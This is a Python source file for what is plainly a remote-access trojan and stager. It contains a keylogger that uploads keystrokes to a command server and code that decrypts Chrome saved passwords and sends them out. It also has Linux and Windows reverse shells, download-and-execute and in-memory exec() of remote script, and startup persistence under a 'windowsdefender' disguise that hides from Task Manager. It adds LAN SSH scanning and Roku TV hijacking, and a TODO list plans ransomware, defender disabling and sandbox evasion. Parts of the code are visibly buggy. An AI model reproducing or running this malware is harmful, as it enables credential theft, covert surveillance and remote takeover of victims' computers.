import subprocess
import psutil
import time
import os
import platform
import requests
import shutil
import getpass
import threading
from socket import *
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
from datetime import timezone, datetime, timedelta
import sys
from ctypes import *

### TO DO ###

# FILE DROPPER
# GRAB ALL IMAGE FILES
# GRAB ALL DB FILES
# Fake lock screen to get admin password
## MONITOR LOG USER ACTIVITIES ###
## OPEN CD DRIVE ##
## HIDE MOUSE ###
### DISABLE TASKMANAGER ###
### DISABLE REGEDIT ###
### DISORD TOKEN RECOVERY ###
### RECORD MIC ###

### collect hardware serial number ###


### disable defender ###
### USB SPREAD ###


### TV CONTROLLER ###

# ROKU MUTE
# PLAY YOUTUBE VIDEO
# curl -X POST http://192.168.1.3:8060/launch/837?contentID=P7sEFDyZmaE 
# Press key

### SAMSUNG TV ###
#   curl -X get http://hostname:3010/command

# ENCRYPT EXEC SCRIPTS AND DECRYPT AT RUNTIME 
# ENCRYPT POST URL REQUESTS, Decrypt from server side
# GUI HTML

### AUTOSTART OPTIONS ###

# 1 STARTUP FOLDER
# 2 WINREG STARTUP
# 3 DESKTOP SHORTCUT CHANGE

### PAYLOAD COMMANDS ###

# CAMSHOT
# GET OPEN WINDOW
# GET BROWSER HISTORY
# GET BROWSER DATA
# GET WINDOW IN FOCUS
# Detect ssh in networks
# Brute force ssh networks


# DBCONFIG
# ADD DELAY BETWEEN COMMAND CHECK REQUESTS

### Security / Prevemptive ###

# Detect Virtual Machine
# Detect sandboxes
# Detect debugger
# Detect wsl on windows
# Detect fresh operating system
# Detect reverse engineering tools

### Quality of Life fixes ###

# Detect linux distrubtion for startup folder directory
# Create hidden admin user
# Start keylogger when specific application are in Focus
# AUTHENTICATE UUID HANDSHAKE
# Run Payload only when a condition is met

# scan for writeable network drives / usb devices, infects exes , bash , py files

# Ransomewere feature

OS = platform.uname()[0]
print(OS)
if OS == "Windows":
    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()



### NAME OF PAYLOAD AND STAGER FILES YOU CAN NAME ANYTHING YOU WANT, DO NOT INCLUDE EXTENTIONS EX. .EXE OR .BIN
_PAYLOAD_NAME = "payload"
_STAGER_NAME = "windowsdefender"

### IF AUTO START == 1, STAGER WILL CHECK THAT IT IS RUNNING IN AUTOSTART MODE
_AUTOSTART_STAGER = 1
_AUTOSTART_STAGER_DESKTOP_SHORTCUTS = 0

### FULL ADDRESS TO THE WEBSERVER
_WEB_SERVER = "127.0.0.1:3000"

### REMOVE FROM STARTUP UNTIL TASKMANAGER IS CLOSED WINDOWS ONLY ###
_WIN_TASK_MANANGER_REMOVE_STARTUP = 0

### DETECT VIRTUAL MACHINE ###
_REMOVE_IF_IN_VM = 1

### PAYLOAD STAGING OPTIONS ###
# 1 = EVAL SCRIPT FROM URL IN MEMORY#
# 2 = DOWNLOAD BINARY TO DISK AND EXECUTE #
_STAGING_OPT = 1

root = 0

### If staging == 1, load these variable's , eval payload needs these variables to run properly ###
###################################################################################################

if _STAGING_OPT == 1:
    import random
    import shlex
    import datetime
    import PIL

    if OS == "Windows":
        pass
    else:pass
    
### PAYLOAD OPTIONS ###
    _FAST_ROOT_OPT = 0
    _REG_URL = 'http://{0}/register'.format(_WEB_SERVER)
    _CHECK_IF_REGISTERED = 'http://{0}/check_if_registered'.format(_WEB_SERVER)
    _CHECK_FOR_COMMAND = 'http://{0}/command'.format(_WEB_SERVER)
    _OS = platform.uname()[0]
    username = getpass.getuser()

### Get current clients ip address from master server ###
    def get_ip():
        try:
                proc = requests.get('http://{0}/getip'.format(_WEB_SERVER))
                return proc.content.decode('utf8')

        except Exception as e:
            pass
            
    _MY_IP = get_ip()
    while _MY_IP == None:
        _MY_IP = get_ip()

### Get current clients master reverse shell information ###
    def get__RSHELL_OPT_ip():
        try:
            proc = requests.get('http://{0}/rshell/{1}/{2}/{3}'.format(_WEB_SERVER, _MY_IP, getpass.getuser(), current_machine_id))
            return proc.content.decode('utf8')
        except Exception as e:
            pass
    
### Requests to insert found wifi names into database ###
    def insert_wifi_name(wifi_name):
        try:
            proc = requests.get('http://{0}/wifi_name/{1}/{2}'.format(_WEB_SERVER, current_machine_id, wifi_name))
        except Exception as e:
            pass

    def start_keylogger():
        GetAsyncKeyState = cdll.user32.GetAsyncKeyState
        special_keys = {0x08: "BS", 0x09: "Tab", 0x0d: "Enter", 0x10: "Shift", 0x11: "Ctrl", 0x12: "Alt", 0x14: "CapsLock", 0x1b: "Esc", 0x20: "Space", 0x2e: "Del"}
        log = []
        logstring = ""

        # reset key states
        for i in range(256):
            GetAsyncKeyState(i)

        while True:
            if len(log) >= 25:
                # UPLOAD LOG HERE #
                for character in log:
                    logstring = logstring + character
                requests.get('http://{0}/keylogger/{1}/{2}/{3}/{4}'.format(_WEB_SERVER, _MY_IP, getpass.getuser(), current_machine_id, logstring))
                logstring = ""
                log = []
            for i in range(256):
                if GetAsyncKeyState(i) & 1:
                    if i in special_keys:
                        pass
                    elif 0x30 <= i <= 0x5a:
                        ### characters a-z/0-9 ###
                        log.append("%c" % i,)
                    else:
                        pass
    
### START YOUTUBE VIDEO ON ALL TV'S SUPPORTED ###
def tv_play_youtube(VIDEO_ID):
    iprange = [
    "192.168.1.1",
    "10.0.0.1"
    ]

    for ip in iprange:
        i = 1
        j = 1

        for x in range(222255):
            if i > 255:
                i = 1
                j+=1
            if j > 255:
                pass
            else:

                print(ip[:-3]+ "{0}.{1}".format(j, i))

                ### ROKU TV'S ###
                os.system("curl -m 0.1 -X POST http://{0}:8060/launch/837?contentID=P7sEFDyZmaE".format(ip[:-3]+ "{0}.{1}".format(j, i)))

                ### SAMSUNG TV'S ###
                ## NOT YET SUPPORTED ##
                ### FIRE TV ###
            
            i+=1

### SCAN FOR SSH SERVERS ###
def scan_for_ssh():
    target_ports = [22]

    def scanf(target):
        for port in target_ports:
            s = socket(AF_INET, SOCK_STREAM)   
            
            conn = s.connect_ex((target, port))
            if(conn == 0) :
                print ('Port ={0}: OPEN on {1}'.format(port, target))
                s.send(b'GET HTTP/1.1 \r\n')
                data = s.recv(2048)
                print(data)
                if b"nginx" in data.lower():
                    print('zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz')
                
                elif b"roku" in data.lower():
                    print("rokuuuuuuuuuuuuuuuuuuuuu")
                s.close()
            else:
                s.close()

    ### Go threw all ip ranges, and play a video from youtube ###
    iprange = [
        "192.168.1.1"
        ]

    for ip in iprange:
        i = 1
        j = 1

        tlock = False
        while tlock == False:
            if threading.activeCount() < 10:
                if i >= 256:
                    exit()
                
                if j >= 256:
                    exit()

                target = ip[:-3]+ "{0}.{1}".format(j, i)
                print(target)
                t = threading.Thread(target=scanf, args=[target])
                t.start()       
                i+=1   
            else:
                tlock == True
### Start keylogger ###
    

### Get chrome credientials . credit goes to https://www.geeksforgeeks.org/how-to-extract-chrome-passwords-in-python/ i just copied and pasted this here ###

    def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date 
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
        return datetime.datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
  
    def fetching_encryption_key():
    # Local_computer_directory_path will look 
    # like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
        local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
        "User Data", "Local State")
        
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)
    
        # decoding the encryption key using base64
        encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])
        
        # remove Windows Data Protection API (DPAPI) str
        encryption_key = encryption_key[5:]
        
        # return decrypted key
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]
            
            # generate cipher
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
            
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"
  
    def get_chrome_credentials():
        key = fetching_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)
        
        # connecting to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        
        # 'logins' table has the data
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")
        
        # iterate over all rows
        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = password_decryption(row[3], key)
            date_of_creation = row[4]
            last_usuage = row[5]

            url = ""
            url.join(main_url)
            print(url)
            main_url = main_url.replace( "https://", '0')
            main_url = main_url.replace( "/", '')
            print(main_url)
            
            if user_name or decrypted_password:
                requests.get('http://{0}/browser_creds/{1}/{2}/{3}/{4}'.format(_WEB_SERVER, current_machine_id, main_url, user_name, decrypted_password))
            else:
                continue
            
            if date_of_creation != 86400000000 and date_of_creation:
                print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
            
            if last_usuage != 86400000000 and last_usuage:
                print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
            print("=" * 100)
        cursor.close()
        db.close()
        
        try:
            
            # trying to remove the copied db file as 
            # well from local computer
            os.remove(filename)
        except:
            pass
    
### Reverse shell function ###
    def _RSHELL_OPT_():
        print(get__RSHELL_OPT_ip().split()[0])
        print(get__RSHELL_OPT_ip().split()[1])
        try:
            if platform.uname()[0] == "Linux":
                    try:
                        exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.format(get__RSHELL_OPT_ip().split()[0], get__RSHELL_OPT_ip().split()[1]))
                    except Exception as e:
                        print(e)
                        timer = threading.Timer(5, _RSHELL_OPT_)
                        timer.start()
                        pass
                        
            elif platform.uname()[0] == "Windows":
                import os,socket,subprocess,threading;
                def s2p(s, p):
                    while True:
                        data = s.recv(1024)
                        if len(data) > 0:
                            p.stdin.write(data)
                            p.stdin.flush()

                def p2s(s, p):
                    while True:
                        s.send(p.stdout.read(1))
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(("{0}".format(get__RSHELL_OPT_ip().split()[0]), int(get__RSHELL_OPT_ip().split()[1])))
                p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
                s2p_thread = threading.Thread(target=s2p, args=[s, p])
                s2p_thread.daemon = True
                s2p_thread.start()
                p2s_thread = threading.Thread(target=p2s, args=[s, p])
                p2s_thread.daemon = True
                p2s_thread.start()
                try:
                    p.wait()
                except KeyboardInterrupt:
                    s.close()
                    timer = threading.Timer(5, _RSHELL_OPT_)
                    timer.start()
                    pass
        except Exception as e:
            print(e)     
            pass

### DOWNLOAD LINKS FOR PAYLOAD AND WATCH DOG
if OS == "Linux":
    _PAYLOAD_LINK = "http://{0}/downloads/linux/payload".format(_WEB_SERVER)
    _STAGER_LINK = "http://{0}/downloads/linux/stager".format(_WEB_SERVER)
    
elif OS == "Windows":
    _PAYLOAD_LINK = "http://{0}/downloads/windows/payload".format(_WEB_SERVER)
    _STAGER_LINK = "http://{0}/downloads/windows/stager".format(_WEB_SERVER)


def start_windows_payload():
    subprocess.call("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME))

### IF OPTION TO AUTOSTART WATCH DOG IS ENABLED, PROCCEED WITH THIS FUNCTION ###
if _AUTOSTART_STAGER == 1:
    if platform.uname()[0] == "Linux":
        try:
            if _STAGER_NAME in os.listdir("/home/{0}/.config/".format(getpass.getuser())):
                pass

        except Exception as e:
            print('cant find config startupfolder')
        else:
            try:
                requests.get(_STAGER_LINK)
                r = requests.get(_STAGER_LINK)
                file = open("./{0}".format(_STAGER_NAME), 'wb')
                subprocess.Popen(["chmod", "+x", "{0}".format(_STAGER_NAME)])
                file.write(r.content)
                file.close()
                shutil.move("./{0}", "/home/{1}/.config/".format(_STAGER_NAME, getpass.getuser()))
                with open("{0}.desktop".format(_STAGER_NAME), "w") as FILE:
                    _STARTUP_LINES = ["[Desktop Entry]", "Type=Application", "Version=1.0", "Name={0}".format(_STAGER_NAME),
                     "Comment=none", "Exec=/home/{0}/.config/{1}".format(getpass.getuser(), _STAGER_NAME), "StartupNotify=false",
                     "Terminal=false"]
                    for LINES in _STARTUP_LINES:
                        FILE.writelines(LINES + "\n")
                    FILE.close()
                shutil.move("./{0}.desktop".format(_STAGER_NAME), "/home/{0}/.config/autostart".format(getpass.getuser()))
            except Exception as e:
                print(e)
                pass
            
    elif platform.uname()[0] == "Windows":
        try:
            if "{0}.exe".format(_STAGER_NAME) in os.listdir("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(getpass.getuser())):
                pass
            else:
                    requests.get(_STAGER_LINK)
                    r = requests.get(_STAGER_LINK)
                    file = open("./{0}.exe".format(_STAGER_NAME), 'wb')
                    file.write(r.content)
                    file.close()
                    shutil.move("./{0}.exe".format(_STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(getpass.getuser()))
        except Exception as e:
            print(e)
            pass

def exec_payload_thread():
    r = requests.get("http://{0}/remote".format(_WEB_SERVER))
    _PAYLOAD_SCRIPT = r.text
    exec(_PAYLOAD_SCRIPT)

if _STAGING_OPT == 1:
    threading.Thread(target=exec_payload_thread).start()
    
while 1:
    time.sleep(1)
    RUNNING = 0
    _WIN_TASK_MANAGER_RUNNING = 0
    for PROC in psutil.process_iter():
        if _STAGING_OPT == 2:
            if PROC.name() == "payload.exe":
                RUNNING = 1
        if PROC.name() == "Taskmgr.exe":
            _WIN_TASK_MANAGER_RUNNING = 1
            
            if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                pass
            else:
                shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft".format(getpass.getuser()))
            
### IF PAYLOAD NOT RUNNING CHECK IF EXISTS. IF NOT DOWNLOAD AND START ###
    if _STAGING_OPT == 2:
        if RUNNING == 0:
            if _WIN_TASK_MANAGER_RUNNING == 1:
                pass
            else:
                try:
                    if OS == "Linux":
                        if os.path.exists("/home/{0}/.config/{1}".format(getpass.getuser(), _PAYLOAD_NAME)):
                            subprocess.Popen(["chmod", "+x", "{0}".format(_PAYLOAD_NAME)])
                            subprocess.call("./home/{0}/.config/{0}".format(getpass.getuser(), _PAYLOAD_NAME))
                        
                    elif OS == "Windows":
                        if _WIN_TASK_MANAGER_RUNNING == 1:
                            pass
                        
                        else:
                            ### IF PAYLOAD NOT IN THE PATH DOWNLOAD FROM LINK ###
                            if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME)):
                                threading.Thread(target=start_windows_payload).start()
                                time.sleep(5)
                                
                            else:
                                requests.get(_PAYLOAD_LINK)
                                r = requests.get(_PAYLOAD_LINK)
                                file = open("./{0}.exe".format(_PAYLOAD_NAME), 'wb')
                                file.write(r.content)
                                file.close()
                                shutil.move("./{0}.exe".format(_PAYLOAD_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME))
                            
                except Exception as e:
                    print(e)
                    pass   

### CHECK IF TASK MANAGER IS RUNNING CROSSPLATFORM ###
    if _WIN_TASK_MANAGER_RUNNING == 1:
        try:
                if OS == "Linux":
                    if os.path.exists("/home/{0}/.config/{1}".format(getpass.getuser(), _PAYLOAD_NAME)):
                        pass
                    
                elif OS == "Windows":

### IF PAYLOAD IS RUNNING WHILE TASKMANAGER IS RUNNING, KILL IT ###
                    if _STAGING_OPT == 2:
                        for PROC in psutil.process_iter():
                            if PROC.name() == "payload.exe":
                                os.system("taskkill /f /im payload.exe")

### IF STAGER IS IN STARTUP FOLDER WHILE TASKMANAGER IS OPEN, HIDE IT IN ANOTHER FOLDER ###                    
                    if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                        if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                            os.remove("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME))

                        shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft".format(getpass.getuser()))
                        
                        PROC_LIST = []
                        while _WIN_TASK_MANAGER_RUNNING == 1:
                            for PROC in psutil.process_iter():
                                if PROC.name() == "Taskmgr.exe":
                                    PROC_LIST.append("Taskmgr")
                                                              
                                if len(PROC_LIST) == 0:
                                    _WIN_TASK_MANAGER_RUNNING = 0
                                    
                            PROC_LIST = []
                            time.sleep(1)                        
                            
        except Exception as e:
            print(e)
            pass

### WHEN TASK MANAGER IS NO LONGER OPENED MOVE STAGER FILE BACK TO THE STARTUP FOLDER ###
    if _WIN_TASK_MANAGER_RUNNING == 0:
        if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
            if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                os.remove("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME))
            shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\".format(getpass.getuser()))

            
